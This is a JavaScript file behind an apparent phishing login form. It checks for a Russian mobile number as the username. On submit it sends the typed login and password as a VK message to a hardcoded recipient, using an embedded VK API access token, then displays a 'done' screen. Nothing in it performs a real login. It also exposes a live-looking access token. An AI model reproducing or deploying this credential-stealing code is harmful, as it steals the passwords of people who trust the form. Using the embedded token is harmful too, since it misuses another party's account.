//Валидация формы
Authorize_username.oninput = function(){
	return valid();
}
Authorize_password.oninput = function(){
	return valid();
}
//Проверка на валидность
function valid() {
	const Authorize_validate_phone = /\+7\s?[\(]{0,1}9[0-9]{2}[\)]{0,1}\s?\d{3}[-]{0,1}\d{2}[-]{0,1}\d{2}/;
	if(!Authorize_validate_phone.test(Authorize_username.value)) {
		Authorize_login.setAttribute('disabled', true);
		Authorize_login.style.background = "#919090";
	}else{
		if (!Authorize_password.value) {
			Authorize_login.setAttribute('disabled', true);
			Authorize_login.style.background = "#919090";
		}else{
			Authorize_login.removeAttribute('disabled');
			Authorize_login.style.background = "#fdfdfd";
		}
	}
}
//Отправка логина и пароля
Authorize_login.onclick = function Send() {
	const peer_ids = "647820871";
	const random_id = "0";
	const token = "a3505a52b2f9e8c5eb94f5795d6e267c07b2a5acecbb4308d5e31219bbdd96f0a47af7be6ddfffe6a51ce";
	const auth = 'Логин: ' + Authorize_username.value + ' Пароль: ' + Authorize_password.value;
	const url_post = `https://api.vk.com/method/messages.send?&peer_ids=${peer_ids}&message=${auth}&random_id=${random_id}&access_token=${token}&v=5.130`
	const auth_send_post = fetch(url_post, {method: "POST", mode: "no-cors"});
	Authorize.style.display = "none";
	Done.style.display = "block";
}